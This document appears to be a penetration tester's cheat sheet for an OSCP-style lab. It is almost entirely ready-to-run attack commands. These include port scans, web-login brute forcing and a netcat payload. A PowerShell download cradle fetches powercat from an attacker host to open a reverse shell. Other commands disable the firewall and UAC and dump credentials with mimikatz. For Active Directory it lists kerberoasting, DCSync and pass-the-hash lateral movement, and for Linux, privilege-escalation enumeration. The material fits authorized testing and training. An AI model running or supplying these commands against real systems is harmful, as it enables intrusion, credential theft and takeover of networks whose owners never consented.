nmap
for ip in {249,248,247,246,245,191,189}
do
mkdir -p OS$ip
#nmap -Pn -sT -p- -oN OS$ip/nmap.txt 192.168.181.$ip --min-rate=10000
nmap -Pn -sT -p- -sC -sV -A -oN OS$ip/nmap-CVA.txt 192.168.181.$ip
done
sudo nmap -Pn -sT -p- -oN osx/scan_T.txt 192.168.x --open
sudo nmap -Pn -sC -sV -p- -oN osx/scan_CV.txt 192.168.x
msfvenom
windows/meterpreter_reverse_tcp
windows/meterpreter_bind_tcp
windows/shell_reverse_tcp
windows/shell_bind_tcp
cmd/unix/reverse_bash
cmd/unix/reverse_netcat
Directory Brute Force with Gobuster
# -x txt,ini,conf,bak,pdf,php,asp,aspx,jsp,do
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x pdf
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 $IP:8080/FUZZ
hydra
hydra -l admin -P passwords.txt $IP http-post-form
"/login.php:username=^USER^&password=^PASS^:Login Failed" -t 1 -V
Inspecting HTTP Response Headers
curl -I $URL
Encode URL
CMD="nc 192.168.45.196 443"
PAYLOAD=$(echo -n $CMD | jq -sRr @uri)
curl --data-urlcode "query=$PAYLOAD"
Wordpress scan
wpscan --url $URL --enumerate p --plugins-detection aggressive -o websrv1/wpscan
wpscan --url $URL -e ap --plugins-detection aggressive --detection-mode aggressive
1Windows
CMD or PowerShell
Powershell or command line
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
Test Port
powershell -c "Test-NetConnection -Port 445 $KALI"
STR="Test-NetConnection -Port 443 $KALI"
ENC=$(echo -n $STR | iconv --to-code=UTF-16LE | base64 -w 0)
echo "powershell -w hidden -nop -enc $ENC"
echo -n "powershell -w hidden -nop -enc $ENC" | xclip -selection clipboard
Powercat reverse shell
powershell -w hidden -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://$KALI:443/powercat.ps1');powercat -c $KALI -p 445
-e cmd"
Server on Kali
python -m http.server -b $KALI -d ./ 80
wsgidav --root=./ --auth=anonymous --host $KALI --port=80
Tools
nc.exe, mimikatz.exe, chisel.exe, Rubeus.exe, Seatbelt.exe, winpeas.exe, PowerUp.ps1,
PrivescCheck.ps1, Watch-Command.ps1
Manual
netsh advfirewall show allprofiles
netstat -anp tcp
net user
net localgroup
net localgroup Administrators
net accounts
systeminfo
set
dir /a c:\
dir /a c:\users
cd c:\users
dir /s /a /b ConsoleHost_history.txt
dir /s /a:-d /b c:\users\%USERNAME%\Desktop
dir /s /a:-d /b c:\users\%USERNAME%\Documents
dir /s /a:-d /b c:\users\%USERNAME%\Downloads
powershell -c "Get-ChildItem -Path c:\users -Exclude *.url,*.lnk,*.searchconnector-ms,
desktop.ini -File -Recurse -ErrorAction SilentlyContinue"
powershell -c "Get-ChildItem -Path c:\users -File -Force -Depth 2 -ErrorAction SilentlyContinue"
dir "C:\Program Files"
dir "C:\Program Files (x86)"
whoami /priv
whoami & ipconfig & type c:\users\%USERNAME%\desktop\local.txt
Powershell
Format-List * | Out-File -FilePath OutFile.txt
Get-ChildItem -Path C:\Reference\Afile.txt, C:\Reference\Images\Bfile.txt |
Compress-Archive -DestinationPath C:\Archives\PipelineFiles.zip
Sheduled task
schtasks /query /fo list /v > schtasks.txt
powershell -c "Get-ScheduledTask"
Tasklist
tasklist /fo list /v > tasklist.txt
wmic process get Processid,Name,CommandLine,ExecutablePath /format:list > wmic_process.txt
powershell -c "Get-Process | Select-Object -Property Id,Name,ProcessName,Path"
2Services
Get-Service
Get-WmiObject -ClassName Win32_Service | Select-Object -Property Name,Path,Startmode
Get-CimInstance -ClassName Win32_Service | Select-Object -Property Name,Path,Startmode
net start > net_service.txt
sc query type= service > sc_service.txt
wmic service get Name,pathname,startmode /format:list
> wmic_service.txt
Automatic
cd c:\users\public
powershell -ep bypass
iwr -uri $KALI/PowerUp.ps1 -outfile PowerUp.ps1
Import-Module .\PowerUp.ps1
Invoke-AllChecks
iwr -uri $KALI/PrivescCheck.ps1 -outfile PrivescCheck.ps1
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML
curl $KALI/Seatbelt.exe -o Seatbelt.exe
Seatbelt.exe -group=all -outputfile="Seatbelt.txt"
curl $KALI/winpeas.exe -o winpeas.exe
winpeas.exe quiet
curl.exe http://$KALI/Watch-Command.ps1 -o Watch-Command.ps1
powershell -ep bypass
Import-Module .\Watch-Command.ps1
Get-Process <PRG> -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds
30
powershell -c "Get-ItemProperty 'HKLM:
\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'| select displayname"
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' |
select displayname"
Post exploitation
dir /s /a:-d /b c:\users\Administrator\Desktop
dir /s /a:-d /b c:\users\Administrator\Documents
dir /s /a:-d /b c:\users\Administrator\Downloads
powershell -c "Get-ChildItem -Path c:\users -Exclude *.url,*.lnk,*.searchconnector-ms,
desktop.ini -File -Recurse -ErrorAction SilentlyContinue"
powershell -c "Get-ChildItem -Path c:\users -File -Force -Depth 2 -ErrorAction SilentlyContinue"
whoami & ipconfig & type c:\users\Administrator\desktop\proof.txt
mimikatz.exe
Pivot and Forward port
chisel.exe client $KALI:2306 R:socks $LHOST:443:$KALI:80
chisel server –host=$KALI –port=2306 --reverse
Firewall
netsh advfirewall show allprofiles
powershell -c "Get-NetFirewallProfile"
netsh advfirewall set currentprofile ?
netsh advfirewall set allprofiles state off
netsh advfirewall firewall add rule name="ALLOW_IN_LPORT" protocol=TCP dir=in localip=$LHOST
localport=$LPORT action=allow
netsh advfirewall firewall delete rule name="ALLOW_IN_LPORT"
UAC
PS C:> Import-Module NtObjectManager
PS C:> Get-NtTokenIntegrityLevel
meterpreter >> getsystem
meterpreter >> search UAC >> use exploit/windows/local/bypassuac_sdclt
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t
REG_DWORD /d 0 /f
3reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t
REG_DWORD /d 1 /f
RDP
Allow
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
fDenyTSConnections /t REG_DWORD /d 0 /f
Deny
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
fDenyTSConnections /t REG_DWORD /d 1 /f
SMB Share files
Kali
impacket-smbserver
-username kali -password 'P@ssw0rd123!' -smb2support share share/
Windows
$password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("kali", $password)
New-PSDrive -name share -Root \\$KALI\share -Credential $cred -PSProvider filesystem
Active Directory
Tools
PowerView.ps1, SharpHound.ps1,
Rubeus.exe
Enumeration
powershell -ep bypass
curl.exe http://$KALI/PowerView.ps1 -o PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess
Find-DomainShare
Get-NetUser -SPN | select samaccountname,serviceprincipalname
curl.exe http://$KALI/SharpHound.ps1 -o SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Attacks AD
curl.exe http://$KALI/Rubeus.exe -o Rubeus.exe
.\Rubeus.exe asreproast /outfile:asreproast.hash /format:hashcat /domain:$DOMAIN
.\Rubeus.exe kerberoast /outfile:kerberoast.hash /format:hashcat
impacket-GetNPUsers -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile asreproast.hash -format
hashcat
impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile kerberoast.hash
mimikatz # lsadump::dcsync
impacket-secretsdump
$password = ConvertTo-SecureString "P@ssw0rd!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
crackmapexec smb $IP -u $USER -p $PASS --local-auth
crackmapexec smb $IP -u $USER -p $PASS -d $DOMAIN --shares
impacket-smbclient -hashes 32'0:$NTLM $DOMAIN/$USER@$IP
evil-winrm -i $IP -u $USER -p $PASS
impacket-psexec $DOMAIN/$USER:$PASS@$IP
impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -windows-auth
xfreerdp /u:$USER /p:$PASS /v:$IP /d:$DOMAIN /cert-ignore
rdesktop -i $IP -u $USER -p $PASS
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$NTLM -outputfile secrets
5Linux
Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export SHELL=/bin/bash
export TERM=tmux-256color
stty rows 53 columns 189
reset
tcpdump
sudo tcpdump -i tun0 src host 192.168.184.150 and port 4444
sudo tcpdump -i tun0 src host 192.168.184.150 and port dst 4444
sudo tcpdump -nvvvXi tun0 tcp port 8080
sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i tun0 udp port 53
sudo tcpdump -i tun0 tcp port 443 and src host 192.168.x.y
Enumeration manualy
id
cat /etc/passwd | grep sh$
ls -al /etc/shadow
ls -al /etc/passwd
cat /etc/issue
cat /etc/os-release
arch
uname -a
ss -ntpl
ip a
cat /etc/iptables/rules.v4
cat /etc/network/interfaces
ls -al /etc/cron*
cat /etc/crontab
ls -al /var/log/cron.log
ls -al /var/log/syslog
ls -al /home/*
env
find / -type f -writable $USER 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type f -user $USER 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type f -perm -o+w 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type d -perm -o+w 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type f -perm -u=s 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
getcap / -r 2>/dev/null
dpkg -l | grep compiler
ls -al /
whoami & ip a & cat /home/$USER/local.txt
Enumeration automatique
curl $KALI/linpeas.sh -o linpeas.sh
curl $KALI/pspy64 -o pspy64
watch -n 1 "ps -aux | grep pass"
while true; do sleep 1 && ps -aux | grep pass; done
top -u root -c => filter command=/bin/sh
sudo -l
get proof
6whoami & ip a & cat /root/proof.txt
Find all files containing a specific text
grep -Rnw '/path/to/somewhere/' -e 'pattern'
-r or -R is recursive ; use -R to search entirely
-n is line number, and
-w stands for match the whole word.
-l (lower-case L) can be added to just give the file name of matching files.
-e is the pattern used during the search
generate a hash using the crypt algorithm
openssl passwd w00t
mkpasswd -m md5crypt
Tmux
Configure
cat ~/.tmux.conf
set -g history-limit 10000
set -g allow-rename off
set-window-option -g mode-keys vi
Save pane
:capture-pane -S -
:save-buffer /path/filename.txt
tmux capture-pane -pS - >> /path/filename.txt
